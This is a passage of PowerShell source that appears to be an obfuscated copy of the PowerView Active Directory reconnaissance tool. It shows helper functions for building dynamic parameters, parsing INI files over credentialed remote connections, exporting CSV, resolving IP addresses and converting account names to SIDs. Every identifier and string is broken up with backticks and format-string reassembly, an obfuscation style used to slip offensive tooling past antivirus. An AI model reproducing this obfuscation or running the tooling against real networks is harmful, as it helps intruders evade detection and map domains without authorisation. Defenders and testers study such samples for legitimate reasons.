        [Parameter(vaLUEFrOmPipELineBYPropertyNAMe = ${tR`UE}, pArAmeTerSetNamE = "DyNA`mIcpaR`Am`etEr")]
        [int]${pO`sIt`iON},

        [Parameter(ValuEFRompipELiNeBypropERtyNamE = ${tr`Ue}, PARamEtErSEtNaME = "dy`NAmI`cp`ARAmet`ER")]
        [string]${hELPM`ess`Age},

        [Parameter(vALUeFROMpIPelinEBYprOPErtynAmE = ${t`Rue}, pArAmETeRSEtName = "DYn`A`miCPAr`AMeTER")]
        [switch]${D`ontsh`oW},

        [Parameter(VAlueFrompIpELinebYPRoPERTyNAmE = ${TR`Ue}, PAraMEtErsEtnAmE = "DynaM`icpAr`A`M`EteR")]
        [switch]${VA`lU`E`FRom`PipELiNe},

        [Parameter(ValueFROMpiPeLinebYPROpERtynaME = ${t`Rue}, pARAmeTERseTnamE = "DY`N`AM`iCPaR`AMeTer")]
        [switch]${vAL`UEFRoMpIpeLIn`eb`ypro`perTY`Na`me},

        [Parameter(VAlueFROMpIPelINeBYProPeRTynAMe = ${T`RuE}, parAmeTErSEtNaMe = "dyna`mI`C`PA`Ra`mEteR")]
        [switch]${v`ALUEfr`oMrEma`ini`NG`ARgUmEN`Ts},

        [Parameter(valUeFrOMPiPeLINebYprOpeRTYNAMe = ${tR`UE}, PArAmETERseTName = "d`y`NAMIc`pa`Ra`MEteR")]
        [string]${PaRamETERs`E`T`N`AMe} = "__Allp`ARA`MetEr`SeTS",

        [Parameter(VALuEfrOMPiPeLiNEByPrOPertynAME = ${T`RuE}, PaRAMetErsetnaMe = "dynaM`icpar`AmeTEr")]
        [switch]${A`l`LownUll},

        [Parameter(VaLUefroMpipElinEBYPrOPeRtynaME = ${Tr`UE}, parameTeRsetNAMe = "DyNA`MIc`PARA`m`ETer")]
        [switch]${A`LlO`WeMptYsT`R`InG},

        [Parameter(ValUEFromPIpEliNEBypROPerTyNamE = ${T`RUe}, PArAmEteRsETnAme = "D`y`N`AmICpa`RAMeTer")]
        [switch]${Allo`WEmP`T`yc`o`L`lecTION},

        [Parameter(VALuEfrOmpiPElINEbYproPERtyNamE = ${t`RuE}, pARamEtErSetnaMe = "Dy`NA`MICP`AR`A`MeTER")]
        [switch]${VAL`ID`Aten`OTNU`ll},

        [Parameter(vaLUeFRoMpIPeLINebYpROperTynAME = ${tr`Ue}, pArAMeTerSetnamE = "dynA`miCP`Ar`AmET`Er")]
        [switch]${VAl`id`A`T`eNotnuL`LoReMPtY},

        [Parameter(VAlueFroMpipeLINEbyproPeRtYnaME = ${tr`Ue}, paRamETeRseTnaME = "Dy`Na`MiCP`AraME`TEr")]
        [ValidateCount(2,2)]
        [int[]]${VAliD`AT`eCo`UNT},

        [Parameter(VALUefRoMPipeLInEByPrOpERTynAmE = ${Tr`UE}, pArAMeTeRSeTnaMe = "DyN`AmiCp`A`Rameter")]
        [ValidateCount(2,2)]
        [int[]]${vaLID`A`Teran`ge},

        [Parameter(VAluefromPipElInEbYpRopeRtynaMe = ${T`RuE}, PArAMETErseTNAME = "DYnAM`I`c`PARA`mE`Ter")]
        [ValidateCount(2,2)]
        [int[]]${v`AliD`AtELen`GTH},

        [Parameter(VAlUEFroMPIpeLInEByprOPerTyNAmE = ${T`Rue}, paRaMetERsETNAMe = "d`Y`NAmiCPArA`MeTer")]
        [ValidateNotNullOrEmpty()]
        [string]${vaLidat`E`patT`e`Rn},

        [Parameter(vAlUEfroMpIpELinEBYPropERTyNaMe = ${T`RUE}, ParAMetersetnAMe = "D`YnamI`Cp`ARamETeR")]
        [ValidateNotNullOrEmpty()]
        [scriptblock]${v`AlidA`T`EsCrIpT},

        [Parameter(vAlUeFROmPIPElINeBYPropErtyNAMe = ${tr`UE}, pARaMEteRSetNamE = "dynA`MICP`Ara`m`eTer")]
        [ValidateNotNullOrEmpty()]
        [string[]]${VaL`i`date`SeT},

        [Parameter(VAluEFrOMpIpElineBYProPertYnAME = ${t`Rue}, PAraMETERSeTName = "DyNami`cPA`Ra`Meter")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!(${_} -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw ("{22}{14}{18}{5}{0}{8}{13}{24}{12}{23}{11}{4}{6}{10}{3}{25}{1}{20}{16}{17}{15}{21}{19}{7}{2}{9}"-f 'ystem.Man','ned','ob','Def','on','S','.Ru','y ','a','ject','ntime','ti','Autom','g','ary must b','rDictio','ra','mete','e a ','r','Pa','na','Diction','a','ement.','i')
            }
            ${t`Rue}
        })]
        ${dI`cTIoNa`Ry} = ${F`AlSE},

        [Parameter(ManDatORY = ${T`RuE}, VALUEfroMpipElIneBYprOPErtYNaMe = ${tr`UE}, ParAmEtERsEtnAmE = "cre`ATevAR`IAB`Les")]
        [switch]${CReat`ev`ARIABl`ES},

        [Parameter(MaNdAtory = ${Tr`Ue}, valueFrOMPipeLInEBypROpeRtyNaMe = ${Tr`UE}, paRamEterSETnamE = "creaTE`VaRia`BlES")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            
            
            if(${_}.("{2}{0}{1}"-f'y','pe','GetT').Invoke()."NA`Me" -notmatch ("{1}{0}{2}"-f'ona','Dicti','ry')) {
                Throw ("{24}{21}{8}{19}{12}{15}{0}{14}{1}{3}{9}{6}{18}{16}{4}{22}{2}{17}{5}{23}{11}{13}{20}{7}{10}"-f ' ','a','ion.',' Syste','n','B','nage','ictionar','undPara','m.Ma','y object','Pa','ters m','ram','be ','ust','e','PS','m','me','etersD','o','t.Automat','ound','B')
            }
            ${T`RUe}
        })]
        ${b`ouNdpA`RAme`TeRS}
    )

    Begin {
        ${iN`TErN`Al`DIctIO`NaRY} = &("{1}{0}{2}"-f'w-Obj','Ne','ect') -TypeName ("{11}{8}{3}{4}{2}{10}{1}{12}{9}{7}{5}{0}{6}"-f 'eDefinedParameterDicti','t.A','a','em','.Man','m','onary','ti','st','ation.Run','gemen','Sy','utom')
        function _`TeMp { [CmdletBinding()] Param() }
        ${CoMmonP`ARam`E`T`ERs} = (&("{2}{0}{1}"-f 'omm','and','Get-C') ("{1}{0}" -f'p','_tem'))."pARAm`Ete`Rs"."k`Eys"
    }

    Process {
        if(${cRE`AT`EVa`RIABL`eS}) {
            ${bO`UND`kEyS} = ${Bo`UNdpA`R`AmeTe`RS}."K`eYs" | &("{0}{3}{2}{1}" -f 'Wh','ject','re-Ob','e') { ${com`mO`NPAra`M`EtERS} -notcontains ${_} }
            ForEach(${pArA`me`Ter} in ${bo`UNDke`YS}) {
                if (${PaR`A`M`eteR}) {
                    &("{0}{2}{1}" -f 'Set-V','ble','aria') -Name ${pa`R`AmETER} -Value ${bOU`N`Dp`ARAmeTers}.${PAr`Ame`TeR} -Scope 1 -Force
                }
            }
        }
        else {
            ${stALe`k`EYs} = @()
            ${stA`lE`KE`yS} = ${p`s`Bo`UndpaRamET`ERs}.("{0}{1}{2}" -f'GetEnum','era','tor').Invoke() |
                        &("{1}{3}{2}{0}"-f'bject','F','h-O','orEac') {
                            if(${_}."v`AluE"."psO`Bje`ct"."m`EtHO`ds"."N`AmE" -match ((('^Equ'+'alsrGi')  -CREPlaCe  'rGi',[CHAr]36))) {
                                
                                if(!${_}."va`LUe".("{1}{0}{2}"-f 'u','Eq','als').Invoke((&("{3}{0}{2}{1}"-f'et-','le','Variab','G') -Name ${_}."K`EY" -ValueOnly -Scope 0))) {
                                    ${_}."K`eY"
                                }
                            }
                            else {
                                
                                if(${_}."va`lUe" -ne (&("{0}{3}{1}{2}" -f'G','ariabl','e','et-V') -Name ${_}."K`ey" -ValueOnly -Scope 0)) {
                                    ${_}."K`EY"
                                }
                            }
                        }
            if(${sTA`l`E`keYs}) {
                ${STA`LEkE`yS} | &("{1}{2}{0}" -f't','ForE','ach-Objec') {[void]${PsBO`UndP`Ar`AmeterS}.("{0}{1}" -f'Remo','ve').Invoke(${_})}
            }

            
            ${UNBOUnDP`ARAME`TE`RS} = (&("{0}{1}{3}{2}" -f'G','et-Comm','nd','a') -Name (${PScmd`L`et}."myINv`Oc`AT`ION"."inV`O`Cat`IOn`NAME"))."P`ARAMeT`ERs".("{4}{1}{3}{0}{2}" -f'ato','etEnume','r','r','G').Invoke()  |
                                        
                                        &("{2}{1}{3}{0}" -f 'Object','here','W','-') { ${_}."V`ALUE"."P`A`R`AmETErsETs"."k`EYS" -contains ${pS`cmdl`et}.pARAmETerSeTNaMe } |
                                            &("{2}{1}{0}{3}" -f'c','ect-Obje','Sel','t') -ExpandProperty ("{1}{0}" -f 'ey','K') |
                                                
                                                &("{1}{2}{0}{3}" -f 're-O','Wh','e','bject') { ${Psb`o`UNdparAMeT`E`Rs}."K`Eys" -notcontains ${_} }

            
            ${T`mP} = ${N`UlL}
            ForEach (${PAra`ME`TeR} in ${uNbOU`Nd`PArAmE`Te`RS}) {
                ${d`Efaul`TVAlUE} = &("{3}{1}{2}{0}"-f 'le','et-Varia','b','G') -Name ${PA`RAm`etER} -ValueOnly -Scope 0
                if(!${psBo`UNDpA`RA`MeterS}."TRyge`T`Va`lue"(${PA`RAME`Ter}, [ref]${T`mp}) -and ${Defa`U`lTVa`lUE}) {
                    ${Ps`BoU`Nd`pA`RameTers}.${p`AR`AMEt`er} = ${d`e`FaUlTVaL`Ue}
                }
            }

            if(${D`I`C`TIoNArY}) {
                ${dpDIcTiO`NA`RY} = ${dI`ctIo`NARY}
            }
            else {
                ${dpDi`Ct`iO`N`ARY} = ${i`NTER`Na`L`dIctIoNa`RY}
            }

            
            ${g`etv`Ar} = {&("{0}{1}{2}"-f'G','et-Variab','le') -Name ${_} -ValueOnly -Scope 0}

            
            ${aT`TR`IB`UTER`EGeX} = (('^'+'(Mandat'+'oryMy'+'K'+'Posi'+'tionMy'+'KParame'+'terSetNameMy'+'KD'+'on'+'tSho'+'wMy'+'KHelpMes'+'s'+'ageMyK'+'V'+'al'+'ueF'+'romPipelineMyKVa'+'l'+'ueFromPipel'+'i'+'neB'+'yPropertyNam'+'eMyK'+'Valu'+'eFromR'+'emainingAr'+'guments)Si8')."r`epla`CE"(([CHAR]77+[CHAR]121+[CHAR]75),[sTrIng][CHAR]124)."R`EPl`Ace"(([CHAR]83+[CHAR]105+[CHAR]56),[sTrIng][CHAR]36))
            ${v`AlidA`Ti`O`N`RegEX} = ((('^(AllowNullXRvAllowEmpt'+'yS'+'tringXRvAllowE'+'m'+'pty'+'Coll'+'ec'+'t'+'i'+'onXRv'+'Vali'+'dateC'+'o'+'untX'+'R'+'vVa'+'lidat'+'e'+'LengthXRvValida'+'t'+'eP'+'at'+'ternXR'+'vV'+'alid'+'ate'+'Ra'+'ng'+'eXRvValida'+'teS'+'cr'+'iptXRvV'+'alidat'+'eSetXRvVal'+'i'+'dateNotN'+'ullXRvV'+'al'+'idat'+'eNot'+'N'+'u'+'llO'+'rEmpty)XVA')  -cReplAce'XRv',[CHAr]124-cReplAce ([CHAr]88+[CHAr]86+[CHAr]65),[CHAr]36))
            ${A`Li`A`SrEgeX} = {('^Alia'+'s{0'+'}')  -f [CHAr]36}
            ${PAR`Ame`TE`RATTR`ibUtE} = &("{0}{2}{1}" -f'N','-Object','ew') -TypeName ("{6}{7}{4}{8}{1}{0}{5}{3}{2}" -f 'rameter','Pa','ute','rib','tomat','Att','System.Management.','Au','ion.')

            switch -regex (${PSBOUndp`ARAm`E`TErS}."k`EYs") {
                ${ATtR`IBU`TER`EGeX} {
                    Try {
                        ${P`ARa`MEte`RATT`R`iBute}.${_} = . ${gE`TVAR}
                    }
                    Catch {
                        ${_}
                    }
                    continue
                }
            }

            if(${DPd`Ic`TiON`ARY}."Ke`YS" -contains ${n`AmE}) {
                ${d`PDICtIO`Na`Ry}.${N`AmE}."aTTRi`Bu`TeS".("{1}{0}" -f 'd','Ad').Invoke(${pAramE`TER`A`Tt`RibUtE})
            }
            else {
                ${ATTRIbUtEc`o`ll`eCT`ION} = &("{1}{2}{0}" -f 'bject','New','-O') -TypeName ("{0}{7}{5}{3}{6}{9}{8}{2}{10}{4}{1}"-f 'Collec','on[System.Attribute]','del','.Ob','Collecti','ns','jec','tio','o','tM','.')
                switch -regex (${p`s`BOu`N`DpARAmete`RS}."k`eYs") {
                    ${vAl`IDA`TIoNre`Gex} {
                        Try {
                            ${pAR`AmeT`eRo`PTiONs} = &("{1}{0}{2}" -f'j','New-Ob','ect') -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. ${gE`Tv`Ar}) -ErrorAction ("{0}{1}"-f 'Sto','p')
                            ${AtTriBU`TeC`oL`LecTiON}.("{1}{0}"-f 'd','Ad').Invoke(${pARAmetE`R`Op`TIoNs})
                        }
                        Catch { ${_} }
                        continue
                    }
                    ${ALIA`s`Re`gEx} {
                        Try {
                            ${pArAmeTER`A`L`Ias} = &("{1}{2}{0}"-f'ect','New-Ob','j') -TypeName ("{6}{0}{11}{7}{10}{5}{3}{4}{1}{8}{2}{9}" -f'y','tomation.Al','ttribu','.','Au','ent','S','tem.M','iasA','te','anagem','s') -ArgumentList (. ${ge`TVAR}) -ErrorAction ("{0}{1}"-f'S','top')
                            ${attRi`B`UTecoLleCTi`On}.("{0}{1}" -f'Ad','d').Invoke(${p`ArAMetEra`LI`As})
                            continue
                        }
                        Catch { ${_} }
                    }
                }
                ${A`TT`RIBut`ecoLlecTion}.("{1}{0}"-f'dd','A').Invoke(${p`A`Ra`me`TERA`Ttrib`Ute})
                ${Pa`R`A`MeTER} = &("{2}{0}{1}"-f 'Obje','ct','New-') -TypeName ("{10}{5}{8}{6}{13}{4}{11}{12}{7}{9}{0}{3}{14}{2}{1}"-f'i','eter','am','nedPa','u','Managem','nt','ntimeDe','e','f','System.','tomation.R','u','.A','r') -ArgumentList @(${na`mE}, ${T`Ype}, ${A`TTR`ib`UtEC`OLLE`cTion})
                ${DPDi`cTi`onary}.("{1}{0}"-f'd','Ad').Invoke(${Na`Me}, ${paRA`ME`TeR})
            }
        }
    }

    End {
        if(!${c`REa`TEv`ArIAbL`ES} -and !${dIc`TIO`N`ARY}) {
            ${D`pd`iCtioNArY}
        }
    }
}


function G`Et-inic`o`N`TEnt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{2}{1}{4}" -f 'ou','roce','ldP','PSSh','ss'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(PosiTiOn = 0, MAnDaTORy = ${t`Rue}, valuEfroMPIpeliNe = ${t`RUE}, vaLUeFrOmPIpELiNebYPROPertyNAmE = ${t`Rue})]
        [Alias({"{2}{1}{0}"-f'me','lNa','Ful'}, {"{0}{1}" -f 'Nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pa`Th},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEdeN`T`ial} =   (Gci  ('VAR'+'IaB'+'Le:21gV'+'7E')).vALuE::"Em`PtY",

        [Switch]
        ${oU`T`P`UTo`BjECT}
    )

    BEGIN {
        ${MaPpe`dC`oMpUt`E`RS} = @{}
    }

    PROCESS {
        ForEach (${taRgEt`p`A`Th} in ${PA`Th}) {
            if ((${ta`R`G`eTpAtH} -Match ((("{0}{4}{3}{1}{2}" -f'{0}{0','*{0}{','0}.*','0}.','}{0}{'))  -F [chAr]92)) -and (${Psbo`U`ND`parAmeTeRS}[("{2}{0}{3}{1}"-f 'eden','ial','Cr','t')])) {
                ${ho`STcOM`P`U`Ter} = (&("{2}{1}{0}" -f 'ct','Obje','New-') ("{2}{1}{0}"-f'em.Uri','st','Sy')(${tARget`P`ATh}))."H`ost"
                if (-not ${mApP`edc`O`mpU`TERs}[${H`OStc`oMPut`Er}]) {
                    
                    &("{3}{2}{5}{0}{4}{1}"-f'emo','eConnection','d','A','t','d-R') -ComputerName ${hosTCo`mpu`TEr} -Credential ${CRED`E`Nti`AL}
                    ${mAP`PEDC`OM`pUt`ErS}[${HOst`Co`m`PUteR}] = ${TR`UE}
                }
            }

            if (&("{1}{2}{0}" -f 'h','Test-Pa','t') -Path ${t`ArGeTP`Ath}) {
                if (${PsBou`Nd`Pa`RAMETers}[("{3}{2}{1}{0}"-f 'ject','utOb','tp','Ou')]) {
                    ${i`N`iOb`JECt} = &("{1}{0}{2}" -f'ew-Obje','N','ct') ("{1}{0}{2}"-f 'SObj','P','ect')
                }
                else {
                    ${I`Ni`obJ`ECT} = @{}
                }
                Switch -Regex -File ${T`ARG`et`PATH} {
                    ((("{3}{1}{2}{0}" -f 'J]','LnJ[(.+)L','n','^'))-RePlace ([CHAr]76+[CHAr]110+[CHAr]74),[CHAr]92) 
                    {
                        ${s`ectIon} = ${mA`TC`HEs}[1].("{1}{0}" -f'rim','T').Invoke()
                        if (${PsB`OUnDP`A`R`AmETeRs}[("{2}{1}{0}"-f 't','Objec','Output')]) {
                            ${sE`CT`ION} = ${s`E`cTiON}.("{0}{1}"-f 'Re','place').Invoke(' ', '')
                            ${S`E`CT`I`oNOBjecT} = &("{2}{1}{0}"-f'ject','Ob','New-') ("{1}{2}{0}"-f 't','PSObj','ec')
                            ${In`iO`BjecT} | &("{2}{0}{1}"-f'dd','-Member','A') ("{2}{0}{1}" -f'opert','y','Notepr') ${S`Ec`TIon} ${sECT`ioNOBJ`ecT}
                        }
                        else {
                            ${iNi`OBJ`ect}[${S`ecTIoN}] = @{}
                        }
                        ${C`ommE`NTco`UNt} = 0
                    }
                    "^(;.*)$" 
                    {
                        ${V`A`lUe} = ${mATc`HEs}[1].("{0}{1}" -f 'Tri','m').Invoke()
                        ${comm`e`N`TCount} = ${CoMm`eNT`CO`UNt} + 1
                        ${N`Ame} = ("{1}{2}{0}"-f 't','C','ommen') + ${C`oM`MENTcOu`Nt}
                        if (${PS`B`o`UndPA`RAMeTers}[("{1}{3}{2}{0}"-f'ject','O','b','utputO')]) {
                            ${na`mE} = ${NA`mE}.("{2}{0}{1}"-f'la','ce','Rep').Invoke(' ', '')
                            ${INIo`B`JeCt}.${se`c`TioN} | &("{2}{0}{1}"-f 'd-Mem','ber','Ad') ("{2}{0}{1}"-f'tep','roperty','No') ${NA`me} ${V`AlUe}
                        }
                        else {
                            ${i`NIOb`j`EcT}[${S`Ec`TION}][${n`AMe}] = ${vaL`Ue}
                        }
                    }
                    ((("{2}{0}{3}{4}{1}"-f '+?)Suq',')','(.','s*=(','.*')).("{0}{2}{1}" -f 'r','E','eplaC').Invoke('Suq','\')) 
                    {
                        ${NA`Me}, ${vaL`UE} = ${ma`T`cHes}[1..2]
                        ${na`Me} = ${nA`ME}.("{1}{0}" -f'rim','T').Invoke()
                        ${V`AlUEs} = ${vAl`Ue}.("{1}{0}" -f'plit','s').Invoke(',') | &("{2}{1}{0}{4}{3}"-f 'h','rEac','Fo','ect','-Obj') { ${_}.("{1}{0}"-f 'im','Tr').Invoke() }

                        

                        if (${PSBoUn`DP`ArAmEte`RS}[("{3}{0}{2}{1}" -f 'utO','ct','bje','Outp')]) {
                            ${n`AmE} = ${Na`ME}.("{0}{1}" -f 'R','eplace').Invoke(' ', '')
                            ${InIOB`J`E`ct}.${sE`CtiOn} | &("{2}{0}{1}{3}"-f'd-Memb','e','Ad','r') ("{2}{0}{3}{1}"-f 'prop','y','Note','ert') ${n`AmE} ${va`L`UES}
                        }
                        else {
                            ${I`NioBje`cT}[${s`Ec`TIon}][${Na`Me}] = ${VA`lU`eS}
                        }
                    }
                }
                ${Inio`BJe`cT}
            }
        }
    }

    END {
        
        ${Ma`pPe`dC`omputErS}."K`EyS" | &("{1}{4}{5}{3}{0}{6}{2}" -f 'e','Re','on','mot','mov','e-Re','Connecti')
    }
}


function Ex`POR`T`-`POW`ErvIEWcsV {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}{4}" -f 'P','Shoul','d','S','Process'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(mANDATOry = ${T`RuE}, valUefrOmpIPeLInE = ${tR`Ue}, vAlUeFRompiPEliNeByPRopertYNAMe = ${T`RUe})]
        [System.Management.Automation.PSObject[]]
        ${I`NPuto`BjeCt},

        [Parameter(ManDAtORy = ${t`RUE}, POSITioN = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${P`AtH},

        [Parameter(poSITiOn = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        ${DelIM`i`TeR} = ',',

        [Switch]
        ${A`p`PEnD}
    )

    BEGIN {
        ${OutPU`T`paTH} =   $zN8id::"GeTf`ULlP`A`Th"(${psB`ouNDPAR`Ame`TE`RS}[("{0}{1}"-f'Pa','th')])
        ${Exis`TS} =  (  gET-VariabLe ("P"+"4Mgk") ).vALuE::("{0}{1}" -f'Exist','s').Invoke(${OutPU`Tp`AtH})

        
        ${MU`T`ex} = &("{2}{1}{3}{0}" -f 't','bje','New-O','c') ("{0}{1}{2}{3}{4}" -f'Syst','em.Thre','ading.Mut','e','x') ${fA`LsE},("{1}{0}"-f'Mutex','CSV')
        ${n`ULL} = ${mut`EX}.("{0}{1}" -f 'Wait','One').Invoke()

        if (${pSBoUnDPARaMe`T`E`RS}[("{1}{0}"-f'pend','Ap')]) {
            ${FiL`eMo`De} =   (  ls  ('vARiABle:'+'D'+'CTh')).VAluE::"A`ppe`ND"
        }
        else {
            ${FI`Le`modE} =  (lS  ('variabLE:'+'D'+'CT'+'H')  ).vaLuE::"c`Reate"
            ${exIS`Ts} = ${fA`l`se}
        }

        ${C`s`VS`TrEam} = &("{2}{0}{1}"-f 'ew','-Object','N') ("{1}{0}{2}"-f'.Fil','IO','eStream')(${Ou`T`P`UtpAtH}, ${fi`LEmo`de},   ( get-vAriaBle  6acU  -VAlUeoNly  )::"WRi`Te",  ( VaRiaBlE  ("r"+"fq"+"p40")  -vAluEO )::"Re`Ad")
        ${C`sV`wriTER} = &("{2}{1}{0}{3}" -f'ec','-Obj','New','t') ("{4}{0}{2}{1}{3}"-f 'ys','.IO.Str','tem','eamWriter','S')(${cs`VStR`Eam})
        ${Cs`V`WritEr}."auTO`F`LusH" = ${tR`Ue}
    }

    PROCESS {
        ForEach (${eNT`Ry} in ${InPut`O`Bj`ecT}) {
            ${Obj`E`ct`cSV} = &("{4}{2}{1}{3}{0}" -f'v','o-C','rtT','s','Conve') -InputObject ${eNt`RY} -Delimiter ${DElI`m`itER} -NoTypeInformation

            if (-not ${EXI`STS}) {
                
                ${ObJE`c`T`Csv} | &("{1}{2}{3}{0}{4}"-f'jec','Fo','rEach','-Ob','t') { ${CS`VWRIT`ER}.("{2}{0}{1}" -f'eLin','e','Writ').Invoke(${_}) }
                ${e`XistS} = ${tR`Ue}
            }
            else {
                
                ${ob`jE`CTCsV}[1..(${oBje`CtC`sV}."l`eNg`Th"-1)] | &("{4}{1}{2}{3}{0}"-f't','ach-Ob','j','ec','ForE') { ${Csv`w`RI`TeR}.("{1}{2}{0}"-f'teLine','Wr','i').Invoke(${_}) }
            }
        }
    }

    END {
        ${mU`T`ex}.("{2}{0}{1}" -f 'l','easeMutex','Re').Invoke()
        ${CSV`wR`it`ER}.("{0}{1}" -f 'Dispo','se').Invoke()
        ${C`sV`s`Tream}.("{2}{0}{1}"-f 'ispos','e','D').Invoke()
    }
}


function REsoLV`E-`iPa`DDResS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}"-f 'Pro','PSShould','s','ces'}, '')]
    [OutputType({"{7}{6}{4}{1}{5}{3}{2}{0}{8}"-f 'Cus','e','ion.PS','utomat','gem','nt.A','em.Mana','Syst','tomObject'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSiTioN = 0, VALuEfRoMpiPElINe = ${Tr`Ue}, VALuEFrOMpipELIneByprOPErtYNAmE = ${T`RUe})]
        [Alias({"{0}{1}" -f'Hos','tName'}, {"{3}{1}{2}{0}" -f 'me','tn','a','dnshos'}, {"{0}{1}"-f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CO`M`puTeR`Na`me} = ${ENV:CoM`P`UTERNa`mE}
    )

    PROCESS {
        ForEach (${co`MpU`Ter} in ${co`M`P`UTErna`me}) {
            try {
                @((  (variable  D4r -vaLuEo  )::("{3}{1}{0}{2}" -f 'ost','etH','Entry','G').Invoke(${comPu`TeR}))."a`d`dReSslI`St") | &("{0}{2}{1}{3}"-f'ForE','Objec','ach-','t') {
                    if (${_}."a`DDrESs`FAMi`LY" -eq ("{1}{0}{2}" -f 'tw','InterNe','ork')) {
                        ${O`UT} = &("{2}{1}{0}" -f 'ject','b','New-O') ("{1}{2}{0}" -f't','PSOb','jec')
                        ${o`UT} | &("{3}{1}{0}{2}" -f'Memb','dd-','er','A') ("{3}{1}{2}{0}"-f 'y','oteprope','rt','N') ("{1}{0}{3}{2}" -f 'pu','Com','rName','te') ${Com`P`UTER}
                        ${O`UT} | &("{1}{0}{2}"-f'em','Add-M','ber') ("{0}{2}{1}"-f'N','roperty','otep') ("{2}{0}{1}" -f'Add','ress','IP') ${_}."ip`ADD`ReS`STO`strING"
                        ${O`Ut}
                    }
                }
            }
            catch {
                &("{1}{0}{3}{2}"-f 't','Wri','se','e-Verbo') ('[Resolve-IPA'+'d'+'dr'+'es'+'s] '+'C'+'ould'+' '+'no'+'t '+'r'+'es'+'olve '+"$Computer "+'to'+' '+'a'+'n '+'IP'+' '+'A'+'d'+'dress.')
            }
        }
    }
}


function c`OnV`eRtTO`-Sid {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}"-f 'es','PSS','houldProc','s'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(mANDAtoRY = ${TR`UE}, vALuEFROMPiPEliNE = ${t`RUE}, vALuEFRomPIPElINeBypropERTYNaMe = ${T`RUe})]
        [Alias({"{1}{0}" -f 'me','Na'}, {"{1}{2}{0}" -f'y','Ident','it'})]
        [String[]]
        ${ObjeC`T`N`Ame},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoM`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{3}{1}{2}" -f 'nCon','ro','ller','t','Domai'})]
        [String]
        ${sER`VER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REd`En`TIAL} =   $21gv7e::"Emp`TY"
    )

    BEGIN {
        ${dom`AINSeaRc`H`ErA`RGUme`NTS} = @{}
        if (${PSb`OUnD`p`ARaME`TErS}[("{2}{1}{0}"-f 'ain','m','Do')]) { ${doMa`in`Se`ArcHERAr`gUme`NTs}[("{1}{0}"-f 'omain','D')] = ${DOm`AIn} }
        if (${PSb`OuNDPa`RAmET`erS}[("{0}{1}"-f 'Serve','r')]) { ${domaINsE`A`R`cHE`RArGUM`en`Ts}[("{1}{0}"-f 'er','Serv')] = ${S`erveR} }
        if (${PSb`OU`N`dp`ARAMETErs}[("{0}{1}{3}{2}"-f 'Crede','nt','al','i')]) { ${DO`mainSe`ArCHe`R`Ar`Gu`meNTs}[("{2}{0}{1}" -f'ti','al','Creden')] = ${C`REdE`N`TiaL} }
    }

    PROCESS {
        ForEach (${o`BjECt} in ${obJ`ecT`NAMe}) {
            ${obJ`ect} = ${O`BjECt} -Replace '/','\'

            if (${Psb`ounDPArAmE`T`E`RS}[("{0}{1}{3}{2}" -f'Cre','d','ial','ent')]) {
                ${D`N} = &("{2}{1}{0}"-f 'ame','rt-ADN','Conve') -Identity ${Obje`CT} -OutputType 'DN' @DomainSearcherArguments
                if (${dN}) {
                    ${uSe`R`DOmAIN} = ${D`N}.("{3}{1}{2}{0}"-f 'ng','ubSt','ri','S').Invoke(${DN}.("{0}{1}{2}"-f 'Inde','x','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                    ${u`se`RnaME} = ${dN}.("{1}{0}"-f'it','Spl').Invoke(',')[0].("{0}{1}"-f'sp','lit').Invoke('=')[1]

                    ${Dom`AINSe`ArCHE`R`A`RGuMe`NTS}[("{2}{1}{0}" -f 'ty','denti','I')] = ${uS`ERN`A`ME}
                    ${d`OMAinse`ARcHe`RarGU`mEnTs}[("{0}{1}" -f'D','omain')] = ${Us`eRd`Oma`In}
                    ${DOMAinS`eAr`cheRA`RGUM`enTs}[("{1}{2}{0}" -f'ties','Pro','per')] = ("{1}{0}{2}"-f'ects','obj','id')
                    &("{2}{0}{1}{4}{3}"-f't-','DomainO','Ge','t','bjec') @DomainSearcherArguments | &("{0}{1}{2}{4}{3}"-f 'Sele','c','t-Obje','t','c') -Expand ("{3}{2}{1}{0}" -f 'sid','t','ec','obj')
                }
            }
            else {
                try {
                    if (${ob`jE`ct}.("{1}{0}"-f'ontains','C').Invoke('\')) {
                        ${D`Om`AIn} = ${O`Bj`Ect}.("{0}{1}" -f'Sp','lit').Invoke('\')[0]
                        ${o`B`Ject} = ${Ob`Ject}.("{0}{1}"-f 'S','plit').Invoke('\')[1]
                    }
                    elseif (-not ${psBoun`DpAR`A`METe`RS}[("{1}{0}"-f 'ain','Dom')]) {
                        ${DoMai`NsEarcHe`R`ArGUm`ENtS} = @{}
                        ${DO`main} = (&("{3}{0}{1}{2}" -f't-D','om','ain','Ge') @DomainSearcherArguments)."na`mE"
                    }

                    ${O`BJ} = (&("{0}{2}{1}" -f 'N','w-Object','e') ("{3}{5}{0}{4}{7}{6}{1}{2}"-f 'rity','c','ount','Syst','.','em.Secu','Ac','Principal.NT')(${DO`Ma`in}, ${oBje`Ct}))
                    ${o`Bj}."T`R`ANSlAtE"([System.Security.Principal.SecurityIdentifier])."vaL`UE"
                }
                catch {
                    &("{2}{0}{4}{1}{3}" -f'r','e-Verbos','W','e','it') ('['+'Con'+'ve'+'rtTo-SI'+'D] '+'Error'+' '+'co'+'nv'+'ert'+'ing '+"$Domain\$Object "+': '+"$_")
                }
            }
        }
    }
